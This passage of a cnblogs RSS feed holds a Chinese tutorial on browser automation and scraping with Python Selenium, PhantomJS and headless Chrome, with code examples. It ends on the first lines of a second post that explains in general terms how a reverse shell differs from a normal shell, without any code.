&lt;p&gt;　　在使用selenium模块之前要做两件事，一是安装selenium模块，可以用终端用pip，也可以在pycharm里的setting安装；二是我们需要下载一款浏览器驱动程序，下载的驱动程序要和浏览器的版本一致&lt;/p&gt;
&lt;h2&gt;　　二、用谷歌驱动程序来展示selenium模块的用法&lt;/h2&gt;
&lt;h3&gt;　　1，下载谷歌浏览器的驱动程序&lt;/h3&gt;
&lt;p&gt;　　下载地址：http://chromedriver.storage.googleapis.com/index.html，下载驱动程序要和浏览器版本统一，可以在这个网址看该选择哪个版本，直接在网上搜索谷歌浏览器版本与驱动程序版本映射表就可以了。如我的谷歌浏览器是最新的72版。&lt;/p&gt;
&lt;p&gt;　　网上的映射图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1519076/201903/1519076-20190304204028259-821013703.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　所以我选择一个v2.45的驱动程序，去驱动程序下载页面选择v2.45,点击，如果是windows系统的，选择32位是可以用（只有32位供你选择）&lt;/p&gt;
&lt;h3&gt;　　2，简单示例&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver&lt;br/&gt;#首先要实例化一个对象，参数为驱动程序所在位置的路径
driver&lt;/span&gt;=webdriver.Chrome(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;E:\Google\Chrome\Application\chromedriver.exe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
driver.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.baidu.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;给input标签赋值&lt;/span&gt;
search=input(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;请输入想要下载的类型，如美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#这是通过id属性找到搜索框标签，并且给他赋值
driver.find_element_by_id(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).send_keys(search)
&lt;/span&gt;&lt;span&gt;#通过id属性找到‘百度一下’点击标签，&lt;/span&gt;&lt;span&gt;可点击事件触发操作&lt;/span&gt;
driver.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;su&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).click()&lt;br/&gt;driver.close()#关闭驱动程序
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　3，找到标签&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;find_element_by_id()    #通过id属性
find_element_by_name()  #通过name属性
find_element_by_class_name()   #通过class名字
find_element_by_tag_name()     #通过标签名字
find_element_by_link_text()    #通过链接标签的文本
find_element_by_partial_link_text()   #通过链接标签的部分文本
find_element_by_xpath()             #通过xpath
find_element_by_css_selector()     #通过css选择器&lt;br/&gt;注意：&lt;br/&gt;1，find_element_by_找到的第一个，find_elements_by_找到的是所有&lt;br/&gt;2，find_element(By.ID,id)和find_element_by_id(id)是一样的&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　4，找到的标签可用方法&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
#这是找到一个搜索框的标签&lt;br/&gt;input=driver.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ww&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#给这个搜索框输入值
input.send_keys(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;myname&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#把搜索框的值给清空
input.clear()&lt;br/&gt;#这是找到一个按钮标签
button&lt;/span&gt;=driver.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cc&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#触发点击事件
button.click()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　5，动作链&lt;/h3&gt;
&lt;p&gt;　　上面的动作只是输入啊，点击等单个动作的实现，其实还有一些连续的动作，比如说鼠标拖动等，这就是一个动作链。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;em id=&quot;__mceDel&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt;&lt;span&gt;from selenium import&lt;span&gt; webdriver&lt;br/&gt;&lt;em id=&quot;__mceDel&quot;&gt;from selenium.webdriver import&lt;span&gt; ActionChains&lt;/span&gt;&lt;/em&gt;&lt;/span&gt;&lt;br/&gt;import&lt;/span&gt;&lt;span&gt; time
browser &lt;/span&gt;=&lt;span&gt; webdriver.Chrome()
url &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser.get(url)&lt;br/&gt;#这是特例，这个页面相当于有两层HTML，这是进入iframeResult的HTML
browser.switch_to.frame(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;iframeResult&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#找到source标签
source &lt;/span&gt;= browser.find_element_by_css_selector(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#draggable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#找到target标签
target &lt;/span&gt;= browser.find_element_by_css_selector(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#droppable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#实例化一个action对象
actions &lt;/span&gt;=&lt;span&gt; ActionChains(browser)&lt;br/&gt;&lt;/span&gt;#点击source标签，然后不放开
&lt;span&gt;actions.click_and_hold(source).perform()&lt;br/&gt;#把刚才点击不放的标签移动到target标签&lt;br/&gt;&lt;/span&gt;&lt;span&gt;actions.move_to_element(target).perform()&lt;br/&gt;#然后再把source标签往x轴方向移动50
actions.move_by_offset(xoffset&lt;/span&gt;=50,yoffset=&lt;span&gt;0).perform()
#这是释放动作链，也就是松开鼠标
actions.release()&lt;/span&gt;&lt;/em&gt;&lt;/em&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　6，执行js代码&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
browser &lt;/span&gt;=&lt;span&gt; webdriver.Chrome()
browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.jd.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#这是滚动页面的滚动条，这个功能是很好用的，我们知道有很多页面刚进入时，是不会加载完全，当你把滚动条不断往下滚动，又会添加更多的信息，&lt;br/&gt;对于爬取这种页面，如果不用这个方法，得到页面是不完全的
browser.execute_script(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;window.scrollTo(0, document.body.scrollHeight)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
browser.execute_script(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;alert(&quot;123&quot;)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　7，获取标签的信息&lt;/h3&gt;
&lt;p&gt;　　7.1 拿到页面的源代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
#直接用驱动对象'.page_source'就可以&lt;br/&gt;driver.page_source
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　7.2 直接拿标签的属性&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;from selenium &lt;span class=&quot;hljs-keyword&quot;&gt;import webdriver &lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;from selenium.webdriver.common.by &lt;span class=&quot;hljs-keyword&quot;&gt;import By &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;tag=browser.find_element(By.CSS_SELECTOR,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#cc-lm-tcgShowImgContainer img&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;获取标签属性，&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(tag.get_attribute(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;src&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;获取标签ID，位置，名称，大小（了解）&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.id)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.location)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(tag.tag_name)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(tag.size)
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　8，延时等待&lt;/h3&gt;
&lt;p&gt;　　页面加载是分顺序的，很多时候当网速差一点的情况下，就会明显感觉到，先看到是一些html标签，但什么css和js都没有，图片等加载会慢点。所以当我们发送请求后直接拿page_source，不一定能拿到加载完毕的页面，也就拿到源码可能不全，为了确保能拿到完整的源码，有两种等待的方法：一是隐式等待，二是显示等待&lt;/p&gt;
&lt;p&gt;　　8.1 隐式等待&lt;/p&gt;
&lt;p&gt;　　就是等页面加载完毕后在开始查找，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ActionChains
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.by &lt;span&gt;import&lt;/span&gt; By &lt;span&gt;#&lt;/span&gt;&lt;span&gt;按照什么方式查找，By.ID,By.CSS_SELECTOR&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.keys &lt;span&gt;import&lt;/span&gt; Keys &lt;span&gt;#&lt;/span&gt;&lt;span&gt;键盘按键操作&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support &lt;span&gt;import&lt;/span&gt;&lt;span&gt; expected_conditions as EC
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support.wait &lt;span&gt;import&lt;/span&gt; WebDriverWait &lt;span&gt;#&lt;/span&gt;&lt;span&gt;等待页面加载某些元素&lt;/span&gt;
&lt;span&gt;
browser&lt;/span&gt;=&lt;span&gt;webdriver.Chrome()

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;隐式等待:在查找所有元素时，如果尚未被加载，则等10秒&lt;/span&gt;
browser.implicitly_wait(10&lt;span&gt;)

browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.baidu.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag&lt;/span&gt;=browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(Keys.ENTER)

contents&lt;/span&gt;=browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;content_left&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt;没有等待环节而直接查找，找不到则会报错&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(contents)

browser.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　8.2 显式等待&lt;/p&gt;
&lt;p&gt;　　只等要查找的标签加载完毕&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver &lt;span&gt;import&lt;/span&gt;&lt;span&gt; ActionChains
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.by &lt;span&gt;import&lt;/span&gt; By &lt;span&gt;#&lt;/span&gt;&lt;span&gt;按照什么方式查找，By.ID,By.CSS_SELECTOR&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.common.keys &lt;span&gt;import&lt;/span&gt; Keys &lt;span&gt;#&lt;/span&gt;&lt;span&gt;键盘按键操作&lt;/span&gt;
&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support &lt;span&gt;import&lt;/span&gt;&lt;span&gt; expected_conditions as EC
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.support.wait &lt;span&gt;import&lt;/span&gt; WebDriverWait &lt;span&gt;#&lt;/span&gt;&lt;span&gt;等待页面加载某些元素&lt;/span&gt;
&lt;span&gt;
browser&lt;/span&gt;=&lt;span&gt;webdriver.Chrome()
browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.baidu.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)


input_tag&lt;/span&gt;=browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
input_tag.send_keys(Keys.ENTER)


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;显式等待：显式地等待某个元素被加载&lt;/span&gt;
wait=WebDriverWait(browser,10&lt;span&gt;)
wait.until(EC.presence_of_element_located((By.ID,&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;content_left&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)))

contents&lt;/span&gt;=browser.find_element(By.CSS_SELECTOR,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;#content_left&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(contents)


browser.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　9，cookie&lt;/h3&gt;
&lt;p&gt;　　我们知道对于浏览器来说cookie是很重要的，很多情况下服务器都是要对cookie进行验证的&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
 
browser &lt;/span&gt;=&lt;span&gt; webdriver.Chrome()
browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://www.zhihu.com/explore&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;br/&gt;#获取cookie&lt;br/&gt;&lt;/span&gt;&lt;span&gt;browser.get_cookies()&lt;br/&gt;#设置cookie
browser.add_cookie({&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;domain&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;www.zhihu.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;germey&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;})
&lt;/span&gt;&lt;span&gt;#删除cookie
browser.delete_all_cookies()&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　10，异常处理&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.common.exceptions &lt;span&gt;import&lt;/span&gt;&lt;span&gt; TimeoutException,NoSuchElementException,NoSuchFrameException

&lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
    browser&lt;/span&gt;=&lt;span&gt;webdriver.Chrome()
    browser.get(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    browser.switch_to.frame(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;iframssseResult&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; TimeoutException as e:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; NoSuchFrameException as e:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(e)
&lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;:
    browser.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　在这个示例中，我们可以把谷歌浏览器换成火狐等各种浏览器，用法是一样的&lt;/p&gt;
&lt;h2&gt;　　三、phantomJS无界面浏览器&lt;/h2&gt;
&lt;h3&gt;　　1，phantomJS介绍&lt;/h3&gt;
&lt;p&gt;　　上面用的谷歌浏览器是很好用的，而且可视化界面让学习者很好的了解整个过程，但其实在应用中，我们并不需要看到可视化界面，于是就有了phantomJS，它是一款无界面的浏览器，整个实现流程和谷歌一样的，虽然说没有界面，但其有截图功能，用save_screenshot函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; phantomjs路径&lt;/span&gt;
path = r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;PhantomJS驱动路径&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser &lt;/span&gt;=&lt;span&gt; webdriver.PhantomJS(path)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 打开百度&lt;/span&gt;
url = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.baidu.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser.get(url)&lt;/span&gt;&lt;span&gt;
browser.save_screenshot(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;baidu.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找input输入框&lt;/span&gt;
my_input = browser.find_element_by_id(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;kw&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 往框里面写文字&lt;/span&gt;
my_input.send_keys(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;美女&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;截屏&lt;/span&gt;
browser.save_screenshot(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;meinv.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找搜索按钮&lt;/span&gt;
button = browser.find_elements_by_class_name(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;s_btn&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)[0]
button.click()&lt;/span&gt;&lt;span&gt;
browser.save_screenshot(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;show.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;
browser.quit()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　用selenium和phantomJS就可以很友好的实现有些网页的爬取了，比如说需要把滚动条拉倒最下面才会有完整的页面。&lt;/p&gt;
&lt;h3&gt;　　2，爬取需要下拉动作的网页新闻&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; time &lt;span&gt;import&lt;/span&gt;&lt;span&gt; sleep
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time

&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    url &lt;/span&gt;= &lt;span&gt;'https://news.163.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 发起请求前，可以让url表示的页面动态加载出更多的数据&lt;/span&gt;
    path = r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;phantomjs-2.1.1-windows\bin\phantomjs.exe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 创建无界面的浏览器对象&lt;/span&gt;
    bro =&lt;span&gt; webdriver.PhantomJS(path)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 发起url请求&lt;/span&gt;
&lt;span&gt;    bro.get(url)&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 截图&lt;/span&gt;
    bro.save_screenshot(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;1.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 执行js代码（让滚动条向下偏移n个像素（作用：动态加载了更多的电影信息））&lt;/span&gt;
    js = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;window.scrollTo(0,document.body.scrollHeight)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
    bro.execute_script(js)  &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 该函数可以执行一组字符串形式的js代码&lt;/span&gt;&lt;span&gt;
    bro.save_screenshot(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;2.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用爬虫程序爬去当前url中的内容 &lt;/span&gt;
    html_source = bro.page_source &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 该属性可以获取当前浏览器的当前页的源码（html） &lt;/span&gt;
    with open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;./source.html&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;w&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, encoding=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;) as fp: 
        fp.write(html_source) 
    bro.quit()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;　　四、谷歌无头浏览器&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; selenium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; selenium.webdriver.chrome.options &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Options
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 创建一个参数对象，用来控制chrome以无界面模式打开&lt;/span&gt;
chrome_options =&lt;span&gt; Options()
chrome_options.add_argument(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;--headless&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
chrome_options.add_argument(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;--disable-gpu&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 驱动路径&lt;/span&gt;
path = r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;chromedriver.exe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 创建浏览器对象&lt;/span&gt;
browser = webdriver.Chrome(executable_path=path, chrome_options=&lt;span&gt;chrome_options)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 发送请求&lt;/span&gt;
url = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://www.baidu.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
browser.get(url)&lt;/span&gt;&lt;span&gt;
browser.save_screenshot(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;baidu.png&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
browser.quit()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　本篇博客主要借鉴于两位大佬，在此分享大佬的博客&lt;/p&gt;
&lt;p&gt;　　https://www.cnblogs.com/bobo-zhang/p/9685362.html&lt;/p&gt;
&lt;p&gt;　　https://www.cnblogs.com/pyedu/p/10306662.html&lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 14:35:00 +0000</pubDate>
<dc:creator>W的一天</dc:creator>
<og:description>一、selenium模块 之前，我们爬虫是模拟浏览器，但始终不是用的浏览器，但今天我们要说的是另一种爬虫方式，这次不是模拟浏览器，而是用程序去控制浏览器进行一些列操作，也就是selenium。sele</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/12345huangchun/p/10473812.html</dc:identifier>
</item>
<item>
<title>python shell与反弹shell - 雨中落叶</title>
<link>http://www.cnblogs.com/yuzly/p/10473497.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuzly/p/10473497.html</guid>
<description>&lt;p&gt;&lt;span&gt;python shell与反弹shell&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;反弹shell,攻击端是服务端,被攻击端是客户端&lt;/span&gt;&lt;br/&gt;&lt;span&gt;正常shell,攻击端是客户端,被攻击端是服务端&lt;/span&gt; &lt;/p&gt;
&lt;p&gt;&lt;span&gt;反弹shell,先启用服务端,再启用客户端&lt;/span&gt;&lt;/p&gt;
